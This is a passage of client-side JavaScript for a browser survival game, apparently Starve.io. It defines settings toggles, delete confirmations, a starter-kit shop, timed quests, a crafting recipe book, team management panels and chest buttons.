        agree: document.getElementById("cancel_agree").style,
        button: 0,
        i: 0,
        quit: function () {
          T_.safe_cancel.style.display = "none";
          T_.safe_cancel.open = false;
        },
        yes: function () {
          if (__.craft.crafting) {
            client.cancel_crafting();
          }
          T_.safe_cancel.quit();
        },
        checkbox: function () {
          if (T_.safe_cancel.activated) {
            Cookies.set("starve_cancel", "0");
            T_.safe_cancel.agree.display = "inline-block";
            T_.options.cancel_agree.display = "none";
          } else {
            Cookies.set("starve_cancel", "1");
            T_.safe_cancel.agree.display = "none";
            T_.options.cancel_agree.display = "inline-block";
          }
          T_.safe_cancel.activated = !T_.safe_cancel.activated;
        },
        del: function () {
          if (this.activated) {
            this.style.display = "inline-block";
            this.open = true;
          } else {
            this.yes();
          }
        },
        update: function () {
          this.style.left = Math.floor(m - 235) + "px";
          this.style.top = Math.floor(v - 130) + "px";
        }
      };
      this.safe_cancel.id.oncontextmenu = function () {
        return false;
      };
      this.safe_cancel.agree.display = "none";
      if (this.safe_cancel.activated) {
        this.options.cancel_agree.display = "inline-block";
      } else {
        this.options.cancel_agree.display = "none";
      }
      document.getElementById("cancel_yes_delete").addEventListener("mouseup", this.safe_cancel.yes, false);
      document.getElementById("cancel_no_delete").addEventListener("mouseup", this.safe_cancel.quit, false);
      document.getElementById("cancel_case_agree").addEventListener("mouseup", this.safe_cancel.checkbox, false);
      document.addEventListener("cancel_sure_delete", function (e) {
        e.preventDefault();
      }, false);
      this.aliasing = {
        activated: Cookies.get("starve_aliasing") && Cookies.get("starve_aliasing") === "0" ? 0 : 1,
        set_aliasing: function (e) {
          document.getElementById("game_canvas").style.imageRendering = e ? "pixelated" : "auto";
        },
        checkbox: function () {
          if (T_.aliasing.activated === 0) {
            Cookies.set("starve_aliasing", "1");
            T_.aliasing.set_aliasing(1);
            T_.options.aliasing_agree.display = "inline-block";
          } else {
            Cookies.set("starve_aliasing", "0");
            T_.aliasing.set_aliasing(0);
            T_.options.aliasing_agree.display = "none";
          }
          T_.aliasing.activated = (T_.aliasing.activated + 1) % 2;
        }
      };
      if (this.aliasing.activated === 1) {
        this.options.aliasing_agree.display = "inline-block";
      } else {
        this.aliasing.set_aliasing(0);
        this.options.aliasing_agree.display = "none";
      }
      document.getElementById("pixelated_case_agree_opt").addEventListener("mouseup", this.aliasing.checkbox, false);
      this.info_box = {
        activated: Cookies.get("starve_info_box") && Cookies.get("starve_info_box") === "0" ? 0 : 1,
        display: 0,
        x: 0,
        y: 0,
        id: 0,
        craft: 0,
        checkbox: function () {
          if (T_.info_box.activated === 0) {
            Cookies.set("starve_info_box", "1");
            T_.options.info_box_agree.display = "inline-block";
          } else {
            Cookies.set("starve_info_box", "0");
            T_.options.info_box_agree.display = "none";
          }
          T_.info_box.activated = (T_.info_box.activated + 1) % 2;
        },
        trigger: function (e, i, t) {
          if (e && this.activated) {
            this.display = 1;
            this.id = t === 0 ? i.id : ge[i.id].id2;
            this.x = i.info.translate.x + 80;
            this.y = i.info.translate.y;
            this.craft = t;
          }
          return e;
        }
      };
      if (this.info_box.activated === 1) {
        this.options.info_box_agree.display = "inline-block";
      } else {
        this.options.info_box_agree.display = "none";
      }
      document.getElementById("info_case_agree_opt").addEventListener("mouseup", this.info_box.checkbox, false);
      if (Cookies.get("starve_scale")) {
        f = Number(Cookies.get("starve_scale"));
        document.getElementById("input_ratio").value = f;
        f *= re / ne;
        ae();
      }
      this.change_ratio = function () {
        Cookies.set("starve_scale", "" + document.getElementById("input_ratio").value);
        f = document.getElementById("input_ratio").value * (re / ne);
        ae();
      };
      document.getElementById("input_ratio").addEventListener("input", this.change_ratio, false);
      this.safe_delete = {
        open: false,
        activated: Cookies.get("starve_safe") && Cookies.get("starve_safe") === "0" ? 0 : 1,
        id: document.getElementById("sure_delete"),
        style: document.getElementById("sure_delete").style,
        agree: document.getElementById("agree").style,
        button: 0,
        i: 0,
        quit: function () {
          T_.safe_delete.style.display = "none";
          T_.safe_delete.open = false;
        },
        all: function () {
          if (!__.build.wait) {
            if (__.craft.preview < 0 && __.craft.id < 0 && !__.ghost.enabled) {
              client.delete_inv(T_.safe_delete.button);
            }
            T_.safe_delete.quit();
          }
        },
        recycle: function () {
          if (__.craft.workbench && !__.build.wait) {
            if (__.craft.preview < 0 && __.craft.id < 0 && !__.ghost.enabled) {
              client.recycle_inv(T_.safe_delete.button);
            }
            T_.safe_delete.quit();
          }
        },
        one: function () {
          if (!__.build.wait) {
            if (__.craft.preview < 0 && __.craft.id < 0 && !__.ghost.enabled) {
              client.delete_one_inv(T_.safe_delete.button);
            }
            T_.safe_delete.quit();
          }
        },
        checkbox: function () {
          if (T_.safe_delete.activated) {
            Cookies.set("starve_safe", "0");
            T_.safe_delete.agree.display = "inline-block";
            T_.options.agree.display = "none";
          } else {
            Cookies.set("starve_safe", "1");
            T_.safe_delete.agree.display = "none";
            T_.options.agree.display = "inline-block";
          }
          T_.safe_delete.activated = !T_.safe_delete.activated;
        },
        del: function (e) {
          this.button = e;
          document.getElementById("item_to_del").src = sprite[ce[e].img][0]._src === undefined ? sprite[ce[e].img][0].src : sprite[ce[e].img][0]._src;
          if (ce[e].recycle && !__.zombie && __.craft.workbench) {
            document.getElementById("recycle_delete").style.display = "inline-block";
          } else {
            document.getElementById("recycle_delete").style.display = "none";
          }
          if (this.activated) {
            this.style.display = "inline-block";
            this.open = true;
          } else {
            this.all();
          }
        },
        update: function () {
          this.style.left = Math.floor(m - 235) + "px";
          this.style.top = Math.floor(v - 175) + "px";
        }
      };
      this.safe_delete.agree.display = "none";
      if (this.safe_delete.activated) {
        this.options.agree.display = "inline-block";
      } else {
        this.options.agree.display = "none";
      }
      document.getElementById("one_delete").addEventListener("mouseup", this.safe_delete.one, false);
      document.getElementById("yes_delete").addEventListener("mouseup", this.safe_delete.all, false);
      document.getElementById("recycle_delete").addEventListener("mouseup", this.safe_delete.recycle, false);
      document.getElementById("no_delete").addEventListener("mouseup", this.safe_delete.quit, false);
      document.getElementById("case_agree").addEventListener("mouseup", this.safe_delete.checkbox, false);
      this.shop = {
        open: false,
        kit: -1,
        button: rs(60, 60, 0, sprite[Ie.SHOP]),
        id: document.getElementById("shop_starterkit"),
        style: document.getElementById("shop_starterkit").style,
        update: function () {
          this.style.left = Math.floor(m - 300) + "px";
          this.style.top = Math.floor(v - 215) + "px";
        },
        quit: function () {
          T_.shop.open = false;
          T_.shop.style.display = "none";
        },
        select: function () {
          T_.shop.open = !T_.shop.open;
          if (T_.shop.open) {
            T_.shop.style.display = "inline-block";
          } else {
            T_.shop.style.display = "none";
          }
        },
        buy: function () {
          if (T_.shop.kit >= 0) {
            client.choose_kit(T_.shop.kit);
            T_.shop.quit();
            if (ga) {
              ga("send", "event", "Game", "kit", "" + T_.shop.kit);
            }
          }
        },
        init: function () {
          var e = __.shop.value;
          document.getElementById("points_bank").innerHTML = Utils.simplify_number(e) + " points";
          for (var i = 0; i < Ts.length; i++) {
            if (Ts[i].price > e) {
              document.getElementById("starter" + (i + 1)).style.opacity = "0.4";
            } else {
              document.getElementById("starter" + (i + 1)).style.opacity = "1";
            }
          }
          for (i = 1; i < 13; i++) {
            document.getElementById("inv_shop" + i).src = "./img/empty-shop.png";
            document.getElementById("amount_shop" + i).innerHTML = "";
          }
          document.getElementById("buy_kit").style.opacity = "0.2";
        },
        get_starter: function () {
          if (this.id.length > 8) {
            var e = Number(this.id.charAt(7) + this.id.charAt(8));
          } else {
            e = Number(this.id.charAt(7));
          }
          var i = Ts[e - 1];
          if (__.shop.value >= i.price) {
            T_.shop.kit = e;
            document.getElementById("buy_kit").style.opacity = "1";
          } else {
            T_.shop.kit = -1;
            document.getElementById("buy_kit").style.opacity = "0.2";
          }
          i = i.items;
          for (var t = 1, r = 1; t < i.length + 1; t++) {
            if (i[t - 1][1] !== le.BAG) {
              document.getElementById("inv_shop" + r).style.display = "inline-block";
              document.getElementById("inv_shop" + r).src = sprite[ce[i[t - 1][1]].img][0]._src === undefined ? sprite[ce[i[t - 1][1]].img][0].src : sprite[ce[i[t - 1][1]].img][0]._src;
              document.getElementById("amount_shop" + r).innerHTML = "" + i[t - 1][0];
              r++;
            }
          }
          for (; r < 13; r++) {
            document.getElementById("inv_shop" + r).src = "./img/empty-shop.png";
            document.getElementById("amount_shop" + r).innerHTML = "";
          }
        }
      };
      document.getElementById("quit3").addEventListener("mouseup", this.shop.quit, false);
      document.getElementById("buy_kit").addEventListener("mouseup", this.shop.buy, false);
      for (o = 1; o < 11; o++) {
        document.getElementById("starter" + o).addEventListener("mouseup", this.shop.get_starter, false);
      }
      this.quests = {
        open: false,
        activated: Cookies.get("starve_quests") && Cookies.get("starve_quests") === "1" ? 1 : 0,
        button: rs(60, 60, 0, sprite[Ie.QUEST_BUTTON]),
        id: document.getElementById("chronoquest"),
        style: document.getElementById("chronoquest").style,
        update: function () {
          this.style.left = Math.floor(m - 420) + "px";
          this.style.top = Math.floor(v - 270) + "px";
        },
        quit: function () {
          T_.quests.style.display = "none";
          T_.quests.open = false;
        },
        select: function () {
          T_.quests.open = !T_.quests.open;
          if (T_.quests.open) {
            T_.quests.style.display = "inline-block";
          } else {
            T_.quests.style.display = "none";
          }
        },
        list: [],
        reset: function () {
          for (var e = 0; e < Is.length; e++) {
            this.list[e] = 1;
            document.getElementById("timeremain_" + e).style.display = "inline-block";
            document.getElementById("time_finished_" + e).style.display = "none";
            document.getElementById("claim_reward_" + e).style.display = "none";
          }
        },
        timer: 0,
        born: 0,
        update_chrono: function () {
          if (T_.quests.open) {
            var e = new Date().getTime();
            if (!(e - this.timer < 1000)) {
              this.timer = e;
              for (var i = 0; i < Is.length; i++) {
                if (T_.quests.list[i]) {
                  var t = Is[i].time - (e - s_.clock.init + T_.quests.born);
                  document.getElementById("timeremain_" + i).innerHTML = t > 960000 ? Math.floor(t / 480000) + " days" : t > 480000 ? Math.floor(t / 480000) + " day" : t > 60000 ? Math.floor(t / 60000) + " min" : Math.floor(t / 1000) + " sec";
                }
              }
            }
          }
        },
        restore: function (e) {
          for (var i = 0; i < e.length; i++) {
            if (e[i] != 1) {
              T_.quests.modify_simple(i, e[i]);
            }
          }
        },
        modify_simple: function (e, i) {
          if (!(i !== 3 || e !== 11 && e !== 12)) {
            __.inv.update_bag_size(0, 1);
            T_.update_inv_buttons();
          }
          document.getElementById("timeremain_" + e).innerHTML = "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
          if (i > 1) {
            document.getElementById("time_finished_" + e).innerHTML = "SUCCEED";
            document.getElementById("timeremain_" + e).style.display = "none";
          } else if (i === 0) {
            document.getElementById("time_finished_" + e).innerHTML = "FAILED";
            document.getElementById("timeremain_" + e).style.display = "none";
          }
          document.getElementById("claim_reward_" + e).style.display = i === 2 ? "inline-block" : "none";
          document.getElementById("time_finished_" + e).style.display = "inline";
          T_.quests.list[e] = 0;
        },
        modify: function (e, i) {
          T_.quests.modify_simple(e, i);
          if (T_.quests.activated) {
            T_.quests.open = true;
            T_.quests.style.display = "inline-block";
          }
        },
        checkbox: function () {
          if (T_.quests.activated) {
            Cookies.set("starve_quests", "0");
            T_.options.quests_agree.display = "none";
          } else {
            Cookies.set("starve_quests", "1");
            T_.options.quests_agree.display = "inline-block";
          }
          T_.quests.activated = !T_.quests.activated;
        },
        claim: function () {
          var e = Number(this.id.charAt(13));
          var i = Number(this.id.charAt(14));
          if (this.id.charAt(14) !== "" && i >= 0 && i <= 9) {
            e = e * 10 + i;
          }
          client.claim_quest_reward(e);
        }
      };
      if (this.quests.activated) {
        this.options.quests_agree.display = "inline-block";
      } else {
        this.options.quests_agree.display = "none";
      }
      document.getElementById("quit_chronoquest").addEventListener("mouseup", this.quests.quit, false);
      for (o = 0; o < Is.length; o++) {
        document.getElementById("claim_reward_" + o).addEventListener("mouseup", this.quests.claim, false);
      }
      this.craft_list = {
        open: false,
        button: rs(60, 60, 0, sprite[Ie.RECIPE_BUTTON]),
        list: {
          id: document.getElementById("recipe_craft"),
          style: document.getElementById("recipe_craft").style,
          recipes: [],
          category: 0,
          update: function () {
            this.style.left = Math.floor(m - 335) + "px";
            this.style.top = Math.floor(v - 215) + "px";
          },
          quit: function () {
            document.getElementById("recipe_craft").style.display = "none";
            T_.craft_list.open = false;
          },
          previous: function () {
            document.getElementById("recipe_craft").style.display = "none";
            document.getElementById("home_craft").style.display = "inline-block";
          },
          get_recipe: function (e) {
            if ((i = this.recipes[e]).o) {
              document.getElementById("watercraft").style.display = "inline-block";
            } else {
              document.getElementById("watercraft").style.display = "none";
            }
            if (i.f) {
              document.getElementById("firecraft").style.display = "inline-block";
            } else {
              document.getElementById("firecraft").style.display = "none";
            }
            if (i.w) {
              document.getElementById("workcraft").style.display = "inline-block";
            } else {
              document.getElementById("workcraft").style.display = "none";
            }
            if (i.e) {
              document.getElementById("wellcraft").style.display = "inline-block";
            } else {
              document.getElementById("wellcraft").style.display = "none";
            }
            for (var i = i.r, t = (e = 0, 1); e < i.length; e++) {
              document.getElementById("inv" + t).style.display = "inline-block";
              document.getElementById("inv" + t).src = sprite[ce[i[e][0]].img][0]._src === undefined ? sprite[ce[i[e][0]].img][0].src : sprite[ce[i[e][0]].img][0]._src;
              document.getElementById("numb" + t).innerHTML = "" + i[e][1];
              t++;
            }
            for (; t < 6; t++) {
              document.getElementById("inv" + t).style.display = "none";
              document.getElementById("numb" + t).innerHTML = "";
            }
          },
          select: function (e) {
            this.category = e;
            document.getElementById("home_craft").style.display = "none";
            document.getElementById("workcraft").style.display = "none";
            document.getElementById("firecraft").style.display = "none";
            document.getElementById("watercraft").style.display = "none";
            document.getElementById("wellcraft").style.display = "none";
            document.getElementById("recipe_craft").style.display = "inline-block";
            document.getElementById("inv1").style.display = "none";
            document.getElementById("inv2").style.display = "none";
            document.getElementById("inv3").style.display = "none";
            document.getElementById("inv4").style.display = "none";
            document.getElementById("inv5").style.display = "none";
            document.getElementById("numb1").innerHTML = "";
            document.getElementById("numb2").innerHTML = "";
            document.getElementById("numb3").innerHTML = "";
            document.getElementById("numb4").innerHTML = "";
            document.getElementById("numb5").innerHTML = "";
            for (var i = 0, t = 0; i < ge.length; i++) {
              var r = ge[i];
              if (e === r.t) {
                this.recipes[t] = r;
                t++;
                document.getElementById("img_" + t).style.display = "inline-block";
                document.getElementById("img_" + t).src = sprite[ce[r.id2].img][0]._src === undefined ? sprite[ce[r.id2].img][0].src : sprite[ce[r.id2].img][0]._src;
              }
            }
            for (t++; t < 49; t++) {
              document.getElementById("img_" + t).style.display = "none";
            }
          }
        },
        home: {
          id: document.getElementById("home_craft"),
          style: document.getElementById("home_craft").style,
          update: function () {
            this.style.left = Math.floor(m - 285) + "px";
            this.style.top = Math.floor(v - 170) + "px";
          },
          quit: function () {
            document.getElementById("home_craft").style.display = "none";
            T_.craft_list.open = false;
          }
        },
        select_book: function () {
          this.open = !this.open;
          if (this.open) {
            document.getElementById("home_craft").style.display = "inline-block";
          } else {
            document.getElementById("home_craft").style.display = "none";
            document.getElementById("recipe_craft").style.display = "none";
          }
        }
      };
      document.getElementById("quit").addEventListener("mouseup", this.craft_list.home.quit, false);
      document.getElementById("quitmenu").addEventListener("mouseup", this.craft_list.list.quit, false);
      document.getElementById("backhome").addEventListener("mouseup", this.craft_list.list.previous, false);
      document.getElementById("hatcategory").addEventListener("mouseup", function () {
        T_.craft_list.list.select(Oe.CLOTHES);
      }, false);
      document.getElementById("weaponcategory").addEventListener("mouseup", function () {
        T_.craft_list.list.select(Oe.WEAPONS);
      }, false);
      document.getElementById("toolcategory").addEventListener("mouseup", function () {
        T_.craft_list.list.select(Oe.TOOLS);
      }, false);
      document.getElementById("foodcategory").addEventListener("mouseup", function () {
        T_.craft_list.list.select(Oe.FOODS);
      }, false);
      document.getElementById("placeablecategory").addEventListener("mouseup", function () {
        T_.craft_list.list.select(Oe.UTILS);
      }, false);
      document.getElementById("constructioncategory").addEventListener("mouseup", function () {
        T_.craft_list.list.select(Oe.BASES);
      }, false);
      document.getElementById("img_1").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(0);
      }, false);
      document.getElementById("img_2").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(1);
      }, false);
      document.getElementById("img_3").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(2);
      }, false);
      document.getElementById("img_4").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(3);
      }, false);
      document.getElementById("img_5").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(4);
      }, false);
      document.getElementById("img_6").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(5);
      }, false);
      document.getElementById("img_7").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(6);
      }, false);
      document.getElementById("img_8").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(7);
      }, false);
      document.getElementById("img_9").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(8);
      }, false);
      document.getElementById("img_10").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(9);
      }, false);
      document.getElementById("img_11").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(10);
      }, false);
      document.getElementById("img_12").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(11);
      }, false);
      document.getElementById("img_13").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(12);
      }, false);
      document.getElementById("img_14").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(13);
      }, false);
      document.getElementById("img_15").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(14);
      }, false);
      document.getElementById("img_16").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(15);
      }, false);
      document.getElementById("img_17").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(16);
      }, false);
      document.getElementById("img_18").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(17);
      }, false);
      document.getElementById("img_19").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(18);
      }, false);
      document.getElementById("img_20").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(19);
      }, false);
      document.getElementById("img_21").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(20);
      }, false);
      document.getElementById("img_22").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(21);
      }, false);
      document.getElementById("img_23").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(22);
      }, false);
      document.getElementById("img_24").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(23);
      }, false);
      document.getElementById("img_25").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(24);
      }, false);
      document.getElementById("img_26").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(25);
      }, false);
      document.getElementById("img_27").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(26);
      }, false);
      document.getElementById("img_28").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(27);
      }, false);
      document.getElementById("img_29").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(28);
      }, false);
      document.getElementById("img_30").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(29);
      }, false);
      document.getElementById("img_31").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(30);
      }, false);
      document.getElementById("img_32").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(31);
      }, false);
      document.getElementById("img_33").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(32);
      }, false);
      document.getElementById("img_34").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(33);
      }, false);
      document.getElementById("img_35").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(34);
      }, false);
      document.getElementById("img_36").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(35);
      }, false);
      document.getElementById("img_37").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(36);
      }, false);
      document.getElementById("img_38").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(37);
      }, false);
      document.getElementById("img_39").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(38);
      }, false);
      document.getElementById("img_40").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(39);
      }, false);
      document.getElementById("img_41").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(40);
      }, false);
      document.getElementById("img_42").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(41);
      }, false);
      document.getElementById("img_43").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(42);
      }, false);
      document.getElementById("img_44").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(43);
      }, false);
      document.getElementById("img_45").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(44);
      }, false);
      document.getElementById("img_46").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(45);
      }, false);
      document.getElementById("img_47").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(46);
      }, false);
      document.getElementById("img_48").addEventListener("mousedown", function () {
        T_.craft_list.list.get_recipe(47);
      }, false);
      this.minimap = {
        translate: {
          x: 0,
          y: 0
        },
        marker: {
          x: -1,
          y: -1
        },
        players: [],
        focus: function (e) {
          var i = this.translate.y + (__.inv.can_select.length > 0 ? -120 : -50);
          if (e.x > this.translate.x && e.x < this.translate.x + 193 && e.y > i && e.y < i + 193) {
            this.marker.x = e.x - this.translate.x;
            this.marker.y = e.y - i;
          }
        }
      };
      this.leaderboard = {
        translate: {
          x: 0,
          y: 0
        },
        img: sprite[Ie.LEADERBOARD],
        can: document.createElement("canvas")
      };
      this.leaderboard.can.width = this.leaderboard.img.width;
      this.leaderboard.can.height = this.leaderboard.img.height;
      this.leaderboard.ctx = this.leaderboard.can.getContext("2d");
      this.gauges = {
        translate: {
          x: 0,
          y: 0
        },
        img: sprite[Ie.GAUGES],
        draw: Xn,
        y: 0
      };
      this.leave_team = function () {
        div = document.getElementById("team_box");
        div.innerHTML = "";
        div.innerHTML += "<div id=\"leader\"><img src=\"./img/leaderlogo.png\" style=\"width:25px;margin-right:5px;\" ></img>" + s_.players[__.team[0]].nickname + "</div";
        for (var e = 1; e < __.team.length; e++) {
          div.innerHTML += "<div class=\"nicknames\"> <div style=\"display:inline-block;padding-top:7px;\">" + s_.players[__.team[e]].nickname + "</div></div>";
        }
        div.innerHTML += "<div id=\"leave\" style=\"display:inline-block;\">LEAVE</div></div>";
        div.style.display = "inline-block";
        document.getElementById("leave").addEventListener("click", client.leave_team, false);
      };
      this.show_team = function () {
        div = document.getElementById("team_box");
        div.innerHTML = "";
        div.innerHTML += "<div id=\"leader\"><img src=\"./img/leaderlogo.png\" style=\"width:25px;margin-right:5px;\" ></img>" + s_.players[__.team[0]].nickname + "</div";
        for (var e = 1; e < __.team.length; e++) {
          div.innerHTML += "<div class=\"nicknames\"> <div style=\"display:inline-block;padding-top:7px;\">" + s_.players[__.team[e]].nickname + "</div></div>";
        }
        div.innerHTML += "</div>";
        div.style.display = "inline-block";
      };
      this.manage_team = function () {
        div = document.getElementById("team_box");
        div.innerHTML = "";
        div.innerHTML += "<div id=\"leader\"><img src=\"./img/leaderlogo.png\" style=\"width:25px;margin-right:5px;\" ></img>" + s_.players[__.team[0]].nickname + "</div";
        for (var e = 1; e < __.team.length; e++) {
          div.innerHTML += "<div class=\"nicknames\"> <div style=\"display:inline-block;padding-top:7px;\">" + s_.players[__.team[e]].nickname + "</div><div class=\"eject_member\" id=\"eject_member" + e + "\"><img src=\"./img/close-team.png\" style=\"width:20px;padding:5px;\"></img></div>";
        }
        if (__.totem.lock === 0) {
          div.innerHTML += "<div id=\"lock_team\" style=\"display:inline-block;\">LOCK</div></div>";
        } else {
          div.innerHTML += "<div id=\"lock_team\" style=\"display:inline-block;\">UNLOCK</div></div>";
        }
        document.getElementById("lock_team").addEventListener("click", client.lock_team, false);
        div.style.display = "inline-block";
        for (e = 1; e < __.team.length; e++) {
          switch (e) {
            case 1:
              document.getElementById("eject_member" + e).addEventListener("click", function () {
                client.kick_team(1);
              }, false);
              break;
            case 2:
              document.getElementById("eject_member" + e).addEventListener("click", function () {
                client.kick_team(2);
              }, false);
              break;
            case 3:
              document.getElementById("eject_member" + e).addEventListener("click", function () {
                client.kick_team(3);
              }, false);
              break;
            case 4:
              document.getElementById("eject_member" + e).addEventListener("click", function () {
                client.kick_team(4);
              }, false);
              break;
            case 5:
              document.getElementById("eject_member" + e).addEventListener("click", function () {
                client.kick_team(5);
              }, false);
              break;
            case 6:
              document.getElementById("eject_member" + e).addEventListener("click", function () {
                client.kick_team(6);
              }, false);
              break;
            case 7:
              document.getElementById("eject_member" + e).addEventListener("click", function () {
                client.kick_team(7);
              }, false);
              break;
            case 8:
              document.getElementById("eject_member" + e).addEventListener("click", function () {
                client.kick_team(8);
              }, false);
          }
        }
      };
      this.team_buttons = [];
      this.team_buttons[As.TEAM_LEAVE] = {
        button: rs(60, 60, 0, sprite[Ie.TEAM_BUTTON]),
        action: this.leave_team
      };
      this.team_buttons[As.TEAM_JOIN] = {
        button: rs(60, 60, 0, sprite[Ie.TEAM_BUTTON]),
        action: client.join_team
      };
      this.team_buttons[As.TEAM_MANAGE] = {
        button: rs(60, 60, 0, sprite[Ie.MANAGE_TEAM_BUTTON]),
        action: this.manage_team
      };
      this.team_buttons[As.TEAM_SHOW] = {
        button: rs(60, 60, 0, sprite[Ie.SHOW_TEAM_BUTTON]),
        action: this.show_team
      };
      this.team_buttons[As.TEAM_FULL] = {
        button: rs(60, 60, 0, sprite[Ie.FULL_TEAM_BUTTON]),
        action: function () {}
      };
      this.team_buttons_id = -1;
      this.bread_oven_wood_button = rs(60, 60, 0, sprite[Ie.BREAD_OVEN_WOOD]);
      this.bread_oven_bread_button = rs(60, 60, 0, sprite[Ie.BREAD_OVEN_BREAD]);
      this.bread_oven_flour_button = rs(60, 60, 0, sprite[Ie.WINDMILL_FLOUR]);
      this.windmill_wheat_button = rs(60, 60, 0, sprite[Ie.WINDMILL_WHEAT_SEED]);
      this.windmill_flour_button = rs(60, 60, 0, sprite[Ie.WINDMILL_FLOUR]);
      this.extractor_wood_button = rs(60, 60, 0, sprite[Ie.INV_WOOD]);
      this.extractor_stone_button = rs(60, 60, 0, sprite[Ie.INV_STONE]);
      this.extractor_gold_button = rs(60, 60, 0, sprite[Ie.INV_GOLD]);
      this.extractor_diamond_button = rs(60, 60, 0, sprite[Ie.INV_DIAMOND]);
      this.extractor_amethyst_button = rs(60, 60, 0, sprite[Ie.INV_AMETHYST]);
      this.extractor_reidite_button = rs(60, 60, 0, sprite[Ie.INV_REIDITE]);
      this.furnace_button = rs(60, 60, 0, sprite[Ie.FURNACE_BUTTON]);
      this.chest_padlock = rs(60, 60, 0, sprite[Ie.PADLOCK]);
      this.chest_lockpick = rs(60, 60, 0, sprite[Ie.KEY]);
      this.chest_locked = rs(60, 60, 0, sprite[Ie.LOCKED]);
      this.resurrection = rs(120, 120, 0, sprite[Ie.DRAGON_HEART]);
      this.resurrection.info.translate.x = 10;
      this.resurrection.info.translate.y = 10;
      this.chest_buttons = [];
      this.chest_buttons[le.SWORD] = rs(68, 68, 0, sprite[Ie.CHEST_SWORD], 3);
      this.chest_buttons[le.SWORD].id = le.SWORD;
      this.chest_buttons[le.PICK] = rs(68, 68, 0, sprite[Ie.CHEST_PICK], 3);
      this.chest_buttons[le.PICK].id = le.PICK;
      this.chest_buttons[le.STONE] = rs(68, 68, 0, sprite[Ie.CHEST_STONE], 3);
      this.chest_buttons[le.STONE].id = le.STONE;
      this.chest_buttons[le.WOOD] = rs(68, 68, 0, sprite[Ie.CHEST_WOOD], 3);
      this.chest_buttons[le.WOOD].id = le.WOOD;
      this.chest_buttons[le.PLANT] = rs(68, 68, 0, sprite[Ie.CHEST_PLANT], 3);
      this.chest_buttons[le.PLANT].id = le.PLANT;
      this.chest_buttons[le.CACTUS] = rs(68, 68, 0, sprite[Ie.CHEST_CACTUS], 3);
      this.chest_buttons[le.CACTUS].id = le.CACTUS;
      this.chest_buttons[le.GOLD] = rs(68, 68, 0, sprite[Ie.CHEST_GOLD], 3);
      this.chest_buttons[le.GOLD].id = le.GOLD;
      this.chest_buttons[le.DIAMOND] = rs(68, 68, 0, sprite[Ie.CHEST_DIAMOND], 3);
      this.chest_buttons[le.DIAMOND].id = le.DIAMOND;
      this.chest_buttons[le.PICK_GOLD] = rs(68, 68, 0, sprite[Ie.CHEST_PICK_GOLD], 3);
      this.chest_buttons[le.PICK_GOLD].id = le.PICK_GOLD;
      this.chest_buttons[le.PICK_DIAMOND] = rs(68, 68, 0, sprite[Ie.CHEST_PICK_DIAMOND], 3);
      this.chest_buttons[le.PICK_DIAMOND].id = le.PICK_DIAMOND;
      this.chest_buttons[le.SWORD_GOLD] = rs(68, 68, 0, sprite[Ie.CHEST_SWORD_GOLD], 3);
      this.chest_buttons[le.SWORD_GOLD].id = le.SWORD_GOLD;
      this.chest_buttons[le.SWORD_WOOD] = rs(68, 68, 0, sprite[Ie.CHEST_SWORD_WOOD], 3);
      this.chest_buttons[le.SWORD_WOOD].id = le.SWORD_WOOD;
      this.chest_buttons[le.SWORD_DIAMOND] = rs(68, 68, 0, sprite[Ie.CHEST_SWORD_DIAMOND], 3);
      this.chest_buttons[le.SWORD_DIAMOND].id = le.SWORD_DIAMOND;
      this.chest_buttons[le.FIRE] = rs(68, 68, 0, sprite[Ie.CHEST_FIRE], 3);
      this.chest_buttons[le.FIRE].id = le.FIRE;
      this.chest_buttons[le.WORKBENCH] = rs(68, 68, 0, sprite[Ie.CHEST_WORKBENCH], 3);
      this.chest_buttons[le.WORKBENCH].id = le.WORKBENCH;
      this.chest_buttons[le.SEED] = rs(68, 68, 0, sprite[Ie.CHEST_SEED], 3);
